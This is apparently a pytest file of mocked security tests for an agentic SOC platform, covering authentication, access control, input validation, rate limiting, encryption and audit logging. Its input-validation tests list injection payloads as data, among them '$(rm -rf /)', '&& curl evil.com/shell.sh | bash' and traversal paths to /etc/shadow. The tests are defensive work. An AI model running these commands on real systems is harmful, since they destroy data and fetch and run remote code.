"""
Security Tests for Agentic SOC Platform.

Tests authentication, authorization, input validation, rate limiting,
data protection, and security controls.
"""

import pytest
from unittest.mock import AsyncMock, MagicMock, patch
from datetime import datetime, timedelta
import hashlib
import base64
import json


class TestAuthentication:
    """Tests for authentication mechanisms."""

    @pytest.mark.asyncio
    async def test_jwt_token_generation(self):
        """Test JWT token generation with proper claims."""
        with patch("agentic_soc.auth.JWTManager") as mock_jwt:
            mock_instance = MagicMock()
            mock_jwt.return_value = mock_instance

            user_claims = {
                "user_id": "user-123",
                "username": "analyst@company.com",
                "roles": ["soc_analyst", "tier_2"],
                "permissions": ["read:alerts", "write:cases", "execute:playbooks"]
            }

            mock_instance.generate_token.return_value = {
                "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
                "refresh_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
                "token_type": "Bearer",
                "expires_in": 3600,
                "issued_at": datetime.utcnow().isoformat(),
                "claims": user_claims
            }

            result = mock_instance.generate_token(user_claims)

            assert result["token_type"] == "Bearer"
            assert result["expires_in"] == 3600
            assert "access_token" in result
            assert "refresh_token" in result

    @pytest.mark.asyncio
    async def test_jwt_token_validation(self):
        """Test JWT token validation and claim extraction."""
        with patch("agentic_soc.auth.JWTManager") as mock_jwt:
            mock_instance = MagicMock()
            mock_jwt.return_value = mock_instance

            valid_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."

            mock_instance.validate_token.return_value = {
                "valid": True,
                "claims": {
                    "user_id": "user-123",
                    "username": "analyst@company.com",
                    "roles": ["soc_analyst"],
                    "exp": (datetime.utcnow() + timedelta(hours=1)).timestamp(),
                    "iat": datetime.utcnow().timestamp(),
                    "iss": "agentic-soc-platform"
                }
            }

            result = mock_instance.validate_token(valid_token)

            assert result["valid"] is True
            assert result["claims"]["iss"] == "agentic-soc-platform"
            assert result["claims"]["exp"] > datetime.utcnow().timestamp()

    @pytest.mark.asyncio
    async def test_expired_token_rejection(self):
        """Test that expired tokens are rejected."""
        with patch("agentic_soc.auth.JWTManager") as mock_jwt:
            mock_instance = MagicMock()
            mock_jwt.return_value = mock_instance

            expired_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.expired..."

            mock_instance.validate_token.return_value = {
                "valid": False,
                "error": "token_expired",
                "message": "Token expired at 2024-01-01T00:00:00Z",
                "expired_at": "2024-01-01T00:00:00Z"
            }

            result = mock_instance.validate_token(expired_token)

            assert result["valid"] is False
            assert result["error"] == "token_expired"

    @pytest.mark.asyncio
    async def test_invalid_signature_rejection(self):
        """Test that tokens with invalid signatures are rejected."""
        with patch("agentic_soc.auth.JWTManager") as mock_jwt:
            mock_instance = MagicMock()
            mock_jwt.return_value = mock_instance

            tampered_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.tampered..."

            mock_instance.validate_token.return_value = {
                "valid": False,
                "error": "invalid_signature",
                "message": "Token signature verification failed"
            }

            result = mock_instance.validate_token(tampered_token)

            assert result["valid"] is False
            assert result["error"] == "invalid_signature"

    @pytest.mark.asyncio
    async def test_api_key_authentication(self):
        """Test API key-based authentication."""
        with patch("agentic_soc.auth.APIKeyManager") as mock_api:
            mock_instance = MagicMock()
            mock_api.return_value = mock_instance

            api_key = "sk_live_abc123def456"

            mock_instance.validate_key.return_value = {
                "valid": True,
                "key_id": "key-001",
                "owner": "integration-service",
                "scopes": ["read:events", "write:events"],
                "rate_limit": 1000,
                "created_at": "2024-01-01T00:00:00Z",
                "last_used": datetime.utcnow().isoformat()
            }

            result = mock_instance.validate_key(api_key)

            assert result["valid"] is True
            assert "rate_limit" in result
            assert result["scopes"] == ["read:events", "write:events"]

    @pytest.mark.asyncio
    async def test_api_key_rotation(self):
        """Test API key rotation mechanism."""
        with patch("agentic_soc.auth.APIKeyManager") as mock_api:
            mock_instance = MagicMock()
            mock_api.return_value = mock_instance

            mock_instance.rotate_key.return_value = {
                "old_key_id": "key-001",
                "new_key_id": "key-002",
                "new_key": "sk_live_newkey789",
                "old_key_valid_until": (datetime.utcnow() + timedelta(days=7)).isoformat(),
                "rotation_status": "completed"
            }

            result = mock_instance.rotate_key("key-001")

            assert result["rotation_status"] == "completed"
            assert "new_key" in result
            assert result["old_key_id"] != result["new_key_id"]

    @pytest.mark.asyncio
    async def test_oauth_sso_integration(self):
        """Test OAuth/SSO integration for enterprise authentication."""
        with patch("agentic_soc.auth.OAuthProvider") as mock_oauth:
            mock_instance = MagicMock()
            mock_oauth.return_value = mock_instance

            # Simulate SAML assertion
            mock_instance.process_sso_response.return_value = {
                "authenticated": True,
                "provider": "okta",
                "user": {
                    "email": "analyst@company.com",
                    "name": "John Smith",
                    "groups": ["SOC-Analysts", "Tier-2"],
                    "department": "Security Operations"
                },
                "session_id": "sess-abc123",
                "mfa_verified": True
            }

            result = mock_instance.process_sso_response("saml_assertion_data")

            assert result["authenticated"] is True
            assert result["mfa_verified"] is True
            assert "SOC-Analysts" in result["user"]["groups"]

    @pytest.mark.asyncio
    async def test_mfa_totp_verification(self):
        """Test TOTP-based MFA verification."""
        with patch("agentic_soc.auth.MFAManager") as mock_mfa:
            mock_instance = MagicMock()
            mock_mfa.return_value = mock_instance

            mock_instance.verify_totp.return_value = {
                "verified": True,
                "method": "totp",
                "backup_codes_remaining": 8,
                "last_verified": datetime.utcnow().isoformat()
            }

            result = mock_instance.verify_totp("user-123", "123456")

            assert result["verified"] is True
            assert result["method"] == "totp"

    @pytest.mark.asyncio
    async def test_session_management(self):
        """Test secure session management."""
        with patch("agentic_soc.auth.SessionManager") as mock_session:
            mock_instance = MagicMock()
            mock_session.return_value = mock_instance

            mock_instance.create_session.return_value = {
                "session_id": "sess-secure-123",
                "user_id": "user-123",
                "created_at": datetime.utcnow().isoformat(),
                "expires_at": (datetime.utcnow() + timedelta(hours=8)).isoformat(),
                "ip_address": "10.0.0.1",
                "user_agent": "Mozilla/5.0...",
                "secure_flags": {
                    "http_only": True,
                    "secure": True,
                    "same_site": "strict"
                }
            }

            result = mock_instance.create_session("user-123", "10.0.0.1")

            assert result["secure_flags"]["http_only"] is True
            assert result["secure_flags"]["secure"] is True
            assert result["secure_flags"]["same_site"] == "strict"


class TestAuthorization:
    """Tests for authorization and access control."""

    @pytest.mark.asyncio
    async def test_rbac_permission_check(self):
        """Test Role-Based Access Control permission checking."""
        with patch("agentic_soc.auth.RBACManager") as mock_rbac:
            mock_instance = MagicMock()
            mock_rbac.return_value = mock_instance

            mock_instance.check_permission.return_value = {
                "allowed": True,
                "user_id": "user-123",
                "resource": "incidents",
                "action": "write",
                "granted_by_role": "soc_analyst",
                "effective_permissions": ["read:incidents", "write:incidents", "execute:playbooks"]
            }

            result = mock_instance.check_permission("user-123", "incidents", "write")

            assert result["allowed"] is True
            assert "write:incidents" in result["effective_permissions"]

    @pytest.mark.asyncio
    async def test_rbac_permission_denied(self):
        """Test RBAC permission denial."""
        with patch("agentic_soc.auth.RBACManager") as mock_rbac:
            mock_instance = MagicMock()
            mock_rbac.return_value = mock_instance

            mock_instance.check_permission.return_value = {
                "allowed": False,
                "user_id": "user-123",
                "resource": "system_config",
                "action": "write",
                "reason": "insufficient_role",
                "required_role": "admin",
                "user_roles": ["soc_analyst"]
            }

            result = mock_instance.check_permission("user-123", "system_config", "write")

            assert result["allowed"] is False
            assert result["reason"] == "insufficient_role"

    @pytest.mark.asyncio
    async def test_abac_attribute_policy(self):
        """Test Attribute-Based Access Control policies."""
        with patch("agentic_soc.auth.ABACManager") as mock_abac:
            mock_instance = MagicMock()
            mock_abac.return_value = mock_instance

            # Policy: Only analysts in same department can view cases
            mock_instance.evaluate_policy.return_value = {
                "decision": "permit",
                "policy_id": "same_department_cases",
                "subject_attributes": {
                    "user_id": "user-123",
                    "department": "Finance_SOC",
                    "clearance": "confidential"
                },
                "resource_attributes": {
                    "case_id": "CASE-001",
                    "department": "Finance_SOC",
                    "classification": "confidential"
                },
                "matched_rules": ["department_match", "clearance_level"]
            }

            result = mock_instance.evaluate_policy(
                subject={"user_id": "user-123", "department": "Finance_SOC"},
                resource={"case_id": "CASE-001", "department": "Finance_SOC"},
                action="read"
            )

            assert result["decision"] == "permit"

    @pytest.mark.asyncio
    async def test_hierarchical_role_inheritance(self):
        """Test role hierarchy and permission inheritance."""
        with patch("agentic_soc.auth.RBACManager") as mock_rbac:
            mock_instance = MagicMock()
            mock_rbac.return_value = mock_instance

            mock_instance.get_effective_roles.return_value = {
                "user_id": "user-123",
                "assigned_role": "soc_lead",
                "inherited_roles": ["soc_analyst", "viewer"],
                "effective_permissions": [
                    "read:*",
                    "write:incidents",
                    "write:cases",
                    "execute:playbooks",
                    "manage:team",
                    "approve:escalations"
                ],
                "role_hierarchy": {
                    "soc_lead": ["soc_analyst"],
                    "soc_analyst": ["viewer"]
                }
            }

            result = mock_instance.get_effective_roles("user-123")

            assert "soc_analyst" in result["inherited_roles"]
            assert "manage:team" in result["effective_permissions"]

    @pytest.mark.asyncio
    async def test_resource_ownership_check(self):
        """Test resource ownership-based access control."""
        with patch("agentic_soc.auth.OwnershipManager") as mock_owner:
            mock_instance = MagicMock()
            mock_owner.return_value = mock_instance

            mock_instance.check_ownership.return_value = {
                "is_owner": True,
                "resource_type": "investigation",
                "resource_id": "INV-001",
                "owner_id": "user-123",
                "ownership_type": "primary_analyst",
                "can_transfer": True,
                "delegated_access": []
            }

            result = mock_instance.check_ownership("user-123", "investigation", "INV-001")

            assert result["is_owner"] is True
            assert result["ownership_type"] == "primary_analyst"

    @pytest.mark.asyncio
    async def test_data_classification_access(self):
        """Test access control based on data classification levels."""
        with patch("agentic_soc.auth.ClassificationManager") as mock_class:
            mock_instance = MagicMock()
            mock_class.return_value = mock_instance

            mock_instance.check_access.return_value = {
                "allowed": True,
                "user_clearance": "secret",
                "resource_classification": "confidential",
                "access_granted": True,
                "clearance_hierarchy": ["top_secret", "secret", "confidential", "unclassified"]
            }

            result = mock_instance.check_access(
                user_clearance="secret",
                resource_classification="confidential"
            )

            assert result["allowed"] is True

    @pytest.mark.asyncio
    async def test_time_based_access_restrictions(self):
        """Test time-based access control policies."""
        with patch("agentic_soc.auth.TemporalAccessManager") as mock_temporal:
            mock_instance = MagicMock()
            mock_temporal.return_value = mock_instance

            mock_instance.check_temporal_access.return_value = {
                "allowed": True,
                "current_time": datetime.utcnow().isoformat(),
                "user_timezone": "America/New_York",
                "access_window": {
                    "start": "09:00",
                    "end": "18:00",
                    "days": ["monday", "tuesday", "wednesday", "thursday", "friday"]
                },
                "is_within_window": True,
                "override_active": False
            }

            result = mock_instance.check_temporal_access("user-123")

            assert result["allowed"] is True
            assert result["is_within_window"] is True


class TestInputValidation:
    """Tests for input validation and sanitization."""

    @pytest.mark.asyncio
    async def test_sql_injection_prevention(self):
        """Test SQL injection attack prevention."""
        with patch("agentic_soc.security.InputValidator") as mock_validator:
            mock_instance = MagicMock()
            mock_validator.return_value = mock_instance

            malicious_inputs = [
                "'; DROP TABLE alerts; --",
                "1 OR 1=1",
                "admin'--",
                "UNION SELECT * FROM users",
                "1; DELETE FROM events WHERE 1=1"
            ]

            for malicious_input in malicious_inputs:
                mock_instance.validate_query_param.return_value = {
                    "valid": False,
                    "input": malicious_input,
                    "threat_detected": "sql_injection",
                    "sanitized": None,
                    "blocked": True
                }

                result = mock_instance.validate_query_param(malicious_input)
                assert result["valid"] is False
                assert result["threat_detected"] == "sql_injection"

    @pytest.mark.asyncio
    async def test_xss_prevention(self):
        """Test Cross-Site Scripting (XSS) prevention."""
        with patch("agentic_soc.security.InputValidator") as mock_validator:
            mock_instance = MagicMock()
            mock_validator.return_value = mock_instance

            xss_payloads = [
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert('xss')>",
                "javascript:alert('xss')",
                "<svg onload=alert('xss')>",
                "'\"><script>alert(String.fromCharCode(88,83,83))</script>"
            ]

            for payload in xss_payloads:
                mock_instance.sanitize_html.return_value = {
                    "original": payload,
                    "sanitized": "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;",
                    "threats_removed": ["script_tag", "event_handler"],
                    "safe": True
                }

                result = mock_instance.sanitize_html(payload)
                assert result["safe"] is True
                assert "<script>" not in result["sanitized"]

    @pytest.mark.asyncio
    async def test_command_injection_prevention(self):
        """Test OS command injection prevention."""
        with patch("agentic_soc.security.InputValidator") as mock_validator:
            mock_instance = MagicMock()
            mock_validator.return_value = mock_instance

            command_injections = [
                "; cat /etc/passwd",
                "| ls -la",
                "`whoami`",
                "$(rm -rf /)",
                "&& curl evil.com/shell.sh | bash"
            ]

            for injection in command_injections:
                mock_instance.validate_command_input.return_value = {
                    "valid": False,
                    "input": injection,
                    "threat_detected": "command_injection",
                    "dangerous_chars": [";", "|", "`", "$", "&"],
                    "blocked": True
                }

                result = mock_instance.validate_command_input(injection)
                assert result["valid"] is False
                assert result["threat_detected"] == "command_injection"

    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self):
        """Test path traversal attack prevention."""
        with patch("agentic_soc.security.InputValidator") as mock_validator:
            mock_instance = MagicMock()
            mock_validator.return_value = mock_instance

            traversal_attempts = [
                "../../../etc/passwd",
                "....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2fetc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/var/log/../../../etc/shadow"
            ]

            for path in traversal_attempts:
                mock_instance.validate_file_path.return_value = {
                    "valid": False,
                    "input": path,
                    "threat_detected": "path_traversal",
                    "normalized_path": None,
                    "blocked": True
                }

                result = mock_instance.validate_file_path(path)
                assert result["valid"] is False
                assert result["threat_detected"] == "path_traversal"

    @pytest.mark.asyncio
    async def test_ldap_injection_prevention(self):
        """Test LDAP injection prevention."""
        with patch("agentic_soc.security.InputValidator") as mock_validator:
            mock_instance = MagicMock()
            mock_validator.return_value = mock_instance

            ldap_injections = [
                "*)(uid=*))(|(uid=*",
                "admin)(&)",
                "*(|(mail=*))",
                "admin)(|(password=*))"
            ]

            for injection in ldap_injections:
                mock_instance.validate_ldap_input.return_value = {
                    "valid": False,
                    "input": injection,
                    "threat_detected": "ldap_injection",
                    "blocked": True
                }

                result = mock_instance.validate_ldap_input(injection)
                assert result["valid"] is False

    @pytest.mark.asyncio
    async def test_json_schema_validation(self):
        """Test JSON schema validation for API inputs."""
        with patch("agentic_soc.security.SchemaValidator") as mock_schema:
            mock_instance = MagicMock()
            mock_schema.return_value = mock_instance

            # Valid input
            valid_alert = {
                "alert_id": "ALT-001",
                "severity": "high",
                "source": "sigma",
                "timestamp": "2024-01-15T10:30:00Z"
            }

            mock_instance.validate.return_value = {
                "valid": True,
                "input": valid_alert,
                "schema": "alert_create",
                "errors": []
            }

            result = mock_instance.validate(valid_alert, "alert_create")
            assert result["valid"] is True

    @pytest.mark.asyncio
    async def test_json_schema_validation_failure(self):
        """Test JSON schema validation failure handling."""
        with patch("agentic_soc.security.SchemaValidator") as mock_schema:
            mock_instance = MagicMock()
            mock_schema.return_value = mock_instance

            invalid_alert = {
                "alert_id": 123,  # Should be string
                "severity": "extreme",  # Invalid enum
                # Missing required 'source' field
            }

            mock_instance.validate.return_value = {
                "valid": False,
                "input": invalid_alert,
                "schema": "alert_create",
                "errors": [
                    {"field": "alert_id", "error": "type_error", "message": "Expected string, got integer"},
                    {"field": "severity", "error": "enum_error", "message": "Must be one of: low, medium, high, critical"},
                    {"field": "source", "error": "required", "message": "Field is required"}
                ]
            }

            result = mock_instance.validate(invalid_alert, "alert_create")
            assert result["valid"] is False
            assert len(result["errors"]) == 3

    @pytest.mark.asyncio
    async def test_file_upload_validation(self):
        """Test file upload security validation."""
        with patch("agentic_soc.security.FileValidator") as mock_file:
            mock_instance = MagicMock()
            mock_file.return_value = mock_instance

            mock_instance.validate_upload.return_value = {
                "valid": True,
                "filename": "evidence.pcap",
                "content_type": "application/vnd.tcpdump.pcap",
                "size_bytes": 1048576,
                "magic_bytes_match": True,
                "extension_allowed": True,
                "virus_scan": "clean",
                "sha256": "abc123def456..."
            }

            result = mock_instance.validate_upload("evidence.pcap", b"pcap_content")
            assert result["valid"] is True
            assert result["virus_scan"] == "clean"

    @pytest.mark.asyncio
    async def test_malicious_file_rejection(self):
        """Test rejection of malicious file uploads."""
        with patch("agentic_soc.security.FileValidator") as mock_file:
            mock_instance = MagicMock()
            mock_file.return_value = mock_instance

            mock_instance.validate_upload.return_value = {
                "valid": False,
                "filename": "report.pdf.exe",
                "threats_detected": [
                    "double_extension",
                    "executable_content",
                    "virus_detected"
                ],
                "virus_scan": "malware_detected",
                "malware_name": "Trojan.GenericKD.12345",
                "blocked": True
            }

            result = mock_instance.validate_upload("report.pdf.exe", b"malicious_content")
            assert result["valid"] is False
            assert "virus_detected" in result["threats_detected"]


class TestRateLimiting:
    """Tests for rate limiting and abuse prevention."""

    @pytest.mark.asyncio
    async def test_api_rate_limiting(self):
        """Test API endpoint rate limiting."""
        with patch("agentic_soc.security.RateLimiter") as mock_limiter:
            mock_instance = MagicMock()
            mock_limiter.return_value = mock_instance

            mock_instance.check_rate_limit.return_value = {
                "allowed": True,
                "client_id": "api-key-123",
                "endpoint": "/api/v1/alerts",
                "limit": 100,
                "remaining": 95,
                "reset_at": (datetime.utcnow() + timedelta(minutes=1)).isoformat(),
                "window": "1m"
            }

            result = mock_instance.check_rate_limit("api-key-123", "/api/v1/alerts")
            assert result["allowed"] is True
            assert result["remaining"] == 95

    @pytest.mark.asyncio
    async def test_rate_limit_exceeded(self):
        """Test rate limit exceeded handling."""
        with patch("agentic_soc.security.RateLimiter") as mock_limiter:
            mock_instance = MagicMock()
            mock_limiter.return_value = mock_instance

            mock_instance.check_rate_limit.return_value = {
                "allowed": False,
                "client_id": "api-key-123",
                "endpoint": "/api/v1/alerts",
                "limit": 100,
                "remaining": 0,
                "reset_at": (datetime.utcnow() + timedelta(seconds=30)).isoformat(),
                "retry_after": 30,
                "reason": "rate_limit_exceeded"
            }

            result = mock_instance.check_rate_limit("api-key-123", "/api/v1/alerts")
            assert result["allowed"] is False
            assert result["retry_after"] == 30

    @pytest.mark.asyncio
    async def test_adaptive_rate_limiting(self):
        """Test adaptive rate limiting based on system load."""
        with patch("agentic_soc.security.AdaptiveRateLimiter") as mock_limiter:
            mock_instance = MagicMock()
            mock_limiter.return_value = mock_instance

            mock_instance.get_current_limits.return_value = {
                "base_limit": 100,
                "current_limit": 70,
                "reduction_factor": 0.7,
                "system_load": 0.85,
                "reason": "high_system_load",
                "normal_limit_at_load": 0.6
            }

            result = mock_instance.get_current_limits()
            assert result["current_limit"] < result["base_limit"]
            assert result["system_load"] == 0.85

    @pytest.mark.asyncio
    async def test_burst_rate_limiting(self):
        """Test burst rate limiting with token bucket."""
        with patch("agentic_soc.security.TokenBucketLimiter") as mock_bucket:
            mock_instance = MagicMock()
            mock_bucket.return_value = mock_instance

            mock_instance.consume.return_value = {
                "allowed": True,
                "tokens_consumed": 1,
                "tokens_remaining": 49,
                "bucket_capacity": 100,
                "refill_rate": "10/second",
                "last_refill": datetime.utcnow().isoformat()
            }

            result = mock_instance.consume("client-123", tokens=1)
            assert result["allowed"] is True
            assert result["tokens_remaining"] == 49

    @pytest.mark.asyncio
    async def test_ip_based_rate_limiting(self):
        """Test IP-based rate limiting."""
        with patch("agentic_soc.security.IPRateLimiter") as mock_limiter:
            mock_instance = MagicMock()
            mock_limiter.return_value = mock_instance

            mock_instance.check_ip.return_value = {
                "allowed": True,
                "ip_address": "192.168.1.100",
                "requests_in_window": 45,
                "limit": 100,
                "window": "1h",
                "is_whitelisted": False,
                "geo_location": "US"
            }

            result = mock_instance.check_ip("192.168.1.100")
            assert result["allowed"] is True

    @pytest.mark.asyncio
    async def test_concurrent_request_limiting(self):
        """Test concurrent request limiting."""
        with patch("agentic_soc.security.ConcurrencyLimiter") as mock_limiter:
            mock_instance = MagicMock()
            mock_limiter.return_value = mock_instance

            mock_instance.acquire.return_value = {
                "acquired": True,
                "client_id": "client-123",
                "concurrent_requests": 5,
                "max_concurrent": 10,
                "queue_position": None
            }

            result = mock_instance.acquire("client-123")
            assert result["acquired"] is True
            assert result["concurrent_requests"] < result["max_concurrent"]

    @pytest.mark.asyncio
    async def test_brute_force_protection(self):
        """Test brute force attack protection."""
        with patch("agentic_soc.security.BruteForceProtection") as mock_bf:
            mock_instance = MagicMock()
            mock_bf.return_value = mock_instance

            # After 5 failed attempts
            mock_instance.check_login_attempt.return_value = {
                "allowed": False,
                "username": "admin",
                "failed_attempts": 5,
                "lockout_duration": 900,
                "lockout_until": (datetime.utcnow() + timedelta(minutes=15)).isoformat(),
                "reason": "too_many_failed_attempts",
                "ip_address": "192.168.1.50"
            }

            result = mock_instance.check_login_attempt("admin", "192.168.1.50")
            assert result["allowed"] is False
            assert result["lockout_duration"] == 900


class TestDataProtection:
    """Tests for data protection and encryption."""

    @pytest.mark.asyncio
    async def test_encryption_at_rest(self):
        """Test data encryption at rest."""
        with patch("agentic_soc.security.EncryptionManager") as mock_enc:
            mock_instance = MagicMock()
            mock_enc.return_value = mock_instance

            sensitive_data = {"api_key": "secret123", "password": "admin"}

            mock_instance.encrypt.return_value = {
                "ciphertext": base64.b64encode(b"encrypted_data").decode(),
                "algorithm": "AES-256-GCM",
                "key_id": "kms-key-001",
                "iv": base64.b64encode(b"random_iv").decode(),
                "tag": base64.b64encode(b"auth_tag").decode()
            }

            result = mock_instance.encrypt(sensitive_data)
            assert result["algorithm"] == "AES-256-GCM"
            assert "ciphertext" in result

    @pytest.mark.asyncio
    async def test_field_level_encryption(self):
        """Test field-level encryption for sensitive fields."""
        with patch("agentic_soc.security.FieldEncryption") as mock_enc:
            mock_instance = MagicMock()
            mock_enc.return_value = mock_instance

            document = {
                "user_id": "user-123",
                "ssn": "123-45-6789",
                "credit_card": "4111111111111111"
            }

            mock_instance.encrypt_fields.return_value = {
                "user_id": "user-123",  # Not encrypted
                "ssn": "enc:AES256:abc123...",  # Encrypted
                "credit_card": "enc:AES256:def456...",  # Encrypted
                "encrypted_fields": ["ssn", "credit_card"]
            }

            result = mock_instance.encrypt_fields(document, ["ssn", "credit_card"])
            assert result["user_id"] == "user-123"
            assert result["ssn"].startswith("enc:")
            assert result["credit_card"].startswith("enc:")

    @pytest.mark.asyncio
    async def test_data_masking(self):
        """Test sensitive data masking for logs and displays."""
        with patch("agentic_soc.security.DataMasker") as mock_mask:
            mock_instance = MagicMock()
            mock_mask.return_value = mock_instance

            sensitive_log = {
                "message": "User login with password=secret123 from ip=192.168.1.1",
                "api_key": "sk_live_abc123def456",
                "ssn": "123-45-6789"
            }

            mock_instance.mask.return_value = {
                "message": "User login with password=****** from ip=192.168.1.1",
                "api_key": "sk_live_***********",
                "ssn": "***-**-6789",
                "masked_fields": ["password", "api_key", "ssn"]
            }

            result = mock_instance.mask(sensitive_log)
            assert "secret123" not in result["message"]
            assert result["ssn"].endswith("6789")

    @pytest.mark.asyncio
    async def test_key_rotation(self):
        """Test encryption key rotation."""
        with patch("agentic_soc.security.KeyManager") as mock_key:
            mock_instance = MagicMock()
            mock_key.return_value = mock_instance

            mock_instance.rotate_key.return_value = {
                "old_key_id": "key-001",
                "new_key_id": "key-002",
                "rotation_status": "completed",
                "re_encryption_status": {
                    "total_records": 10000,
                    "re_encrypted": 10000,
                    "failed": 0
                },
                "old_key_retirement": (datetime.utcnow() + timedelta(days=30)).isoformat()
            }

            result = mock_instance.rotate_key("key-001")
            assert result["rotation_status"] == "completed"
            assert result["re_encryption_status"]["failed"] == 0

    @pytest.mark.asyncio
    async def test_secure_data_deletion(self):
        """Test secure data deletion (crypto-shredding)."""
        with patch("agentic_soc.security.SecureDeletion") as mock_del:
            mock_instance = MagicMock()
            mock_del.return_value = mock_instance

            mock_instance.delete_user_data.return_value = {
                "user_id": "user-123",
                "deletion_method": "crypto_shred",
                "key_destroyed": True,
                "records_affected": 1500,
                "backup_purge_scheduled": (datetime.utcnow() + timedelta(days=30)).isoformat(),
                "compliance": ["GDPR", "CCPA"],
                "certificate": "DEL-CERT-2024-001"
            }

            result = mock_instance.delete_user_data("user-123")
            assert result["key_destroyed"] is True
            assert result["deletion_method"] == "crypto_shred"

    @pytest.mark.asyncio
    async def test_tls_configuration(self):
        """Test TLS configuration validation."""
        with patch("agentic_soc.security.TLSValidator") as mock_tls:
            mock_instance = MagicMock()
            mock_tls.return_value = mock_instance

            mock_instance.validate_config.return_value = {
                "valid": True,
                "min_version": "TLS1.2",
                "preferred_version": "TLS1.3",
                "cipher_suites": [
                    "TLS_AES_256_GCM_SHA384",
                    "TLS_CHACHA20_POLY1305_SHA256",
                    "TLS_AES_128_GCM_SHA256"
                ],
                "certificate_valid": True,
                "certificate_expiry": (datetime.utcnow() + timedelta(days=365)).isoformat(),
                "hsts_enabled": True,
                "ocsp_stapling": True
            }

            result = mock_instance.validate_config()
            assert result["valid"] is True
            assert result["min_version"] in ["TLS1.2", "TLS1.3"]


class TestAuditLogging:
    """Tests for security audit logging."""

    @pytest.mark.asyncio
    async def test_audit_event_logging(self):
        """Test security audit event logging."""
        with patch("agentic_soc.security.AuditLogger") as mock_audit:
            mock_instance = MagicMock()
            mock_audit.return_value = mock_instance

            audit_event = {
                "event_type": "user_login",
                "user_id": "user-123",
                "ip_address": "192.168.1.100",
                "user_agent": "Mozilla/5.0...",
                "success": True
            }

            mock_instance.log.return_value = {
                "audit_id": "AUD-001",
                "timestamp": datetime.utcnow().isoformat(),
                "event_type": "user_login",
                "actor": "user-123",
                "action": "authentication",
                "resource": "session",
                "outcome": "success",
                "metadata": {
                    "ip_address": "192.168.1.100",
                    "geo_location": "US",
                    "mfa_used": True
                },
                "integrity_hash": hashlib.sha256(b"audit_data").hexdigest()
            }

            result = mock_instance.log(audit_event)
            assert "audit_id" in result
            assert "integrity_hash" in result

    @pytest.mark.asyncio
    async def test_audit_log_tamper_detection(self):
        """Test audit log tamper detection."""
        with patch("agentic_soc.security.AuditIntegrity") as mock_integrity:
            mock_instance = MagicMock()
            mock_integrity.return_value = mock_instance

            mock_instance.verify_chain.return_value = {
                "valid": True,
                "records_verified": 1000,
                "chain_start": "2024-01-01T00:00:00Z",
                "chain_end": "2024-01-15T23:59:59Z",
                "hash_algorithm": "SHA-256",
                "merkle_root": "abc123...",
                "tampering_detected": False
            }

            result = mock_instance.verify_chain("2024-01-01", "2024-01-15")
            assert result["valid"] is True
            assert result["tampering_detected"] is False

    @pytest.mark.asyncio
    async def test_privileged_action_logging(self):
        """Test logging of privileged administrative actions."""
        with patch("agentic_soc.security.AuditLogger") as mock_audit:
            mock_instance = MagicMock()
            mock_audit.return_value = mock_instance

            mock_instance.log_privileged_action.return_value = {
                "audit_id": "PRIV-AUD-001",
                "timestamp": datetime.utcnow().isoformat(),
                "event_type": "privileged_action",
                "actor": "admin-001",
                "action": "user_role_change",
                "target": "user-123",
                "changes": {
                    "before": {"role": "analyst"},
                    "after": {"role": "admin"}
                },
                "justification": "Promotion to SOC Lead",
                "approval": {
                    "approver": "ciso-001",
                    "approved_at": datetime.utcnow().isoformat()
                },
                "requires_review": True
            }

            result = mock_instance.log_privileged_action({
                "action": "user_role_change",
                "target": "user-123",
                "new_role": "admin"
            })

            assert result["event_type"] == "privileged_action"
            assert "approval" in result

    @pytest.mark.asyncio
    async def test_data_access_logging(self):
        """Test logging of sensitive data access."""
        with patch("agentic_soc.security.DataAccessLogger") as mock_access:
            mock_instance = MagicMock()
            mock_access.return_value = mock_instance

            mock_instance.log_access.return_value = {
                "access_id": "ACC-001",
                "timestamp": datetime.utcnow().isoformat(),
                "user_id": "user-123",
                "data_type": "pii",
                "data_classification": "confidential",
                "records_accessed": 50,
                "fields_accessed": ["name", "email", "ssn"],
                "purpose": "incident_investigation",
                "case_reference": "CASE-001",
                "retention_period": "90d"
            }

            result = mock_instance.log_access("user-123", "pii", 50)
            assert result["data_classification"] == "confidential"
            assert "ssn" in result["fields_accessed"]


class TestSecretsManagement:
    """Tests for secrets and credentials management."""

    @pytest.mark.asyncio
    async def test_vault_secret_retrieval(self):
        """Test secure secret retrieval from vault."""
        with patch("agentic_soc.security.VaultClient") as mock_vault:
            mock_instance = MagicMock()
            mock_vault.return_value = mock_instance

            mock_instance.get_secret.return_value = {
                "secret_id": "db/production/credentials",
                "value": {
                    "username": "app_user",
                    "password": "secure_password_123"
                },
                "lease_id": "lease-abc123",
                "lease_duration": 3600,
                "renewable": True,
                "metadata": {
                    "created_at": "2024-01-01T00:00:00Z",
                    "version": 3
                }
            }

            result = mock_instance.get_secret("db/production/credentials")
            assert "value" in result
            assert result["renewable"] is True

    @pytest.mark.asyncio
    async def test_dynamic_credential_generation(self):
        """Test dynamic database credential generation."""
        with patch("agentic_soc.security.VaultClient") as mock_vault:
            mock_instance = MagicMock()
            mock_vault.return_value = mock_instance

            mock_instance.generate_db_credentials.return_value = {
                "username": "v-app-readonly-abc123",
                "password": "dynamic_generated_password",
                "lease_id": "database/creds/readonly/lease-xyz",
                "lease_duration": 3600,
                "role": "readonly",
                "database": "soc_events"
            }

            result = mock_instance.generate_db_credentials("readonly")
            assert result["role"] == "readonly"
            assert result["lease_duration"] == 3600

    @pytest.mark.asyncio
    async def test_secret_rotation_automation(self):
        """Test automated secret rotation."""
        with patch("agentic_soc.security.SecretRotator") as mock_rotator:
            mock_instance = MagicMock()
            mock_rotator.return_value = mock_instance

            mock_instance.rotate.return_value = {
                "secret_id": "api/integration/key",
                "rotation_status": "completed",
                "old_version": 2,
                "new_version": 3,
                "services_updated": ["siem-connector", "threat-intel-feed"],
                "rollback_available": True,
                "next_rotation": (datetime.utcnow() + timedelta(days=30)).isoformat()
            }

            result = mock_instance.rotate("api/integration/key")
            assert result["rotation_status"] == "completed"
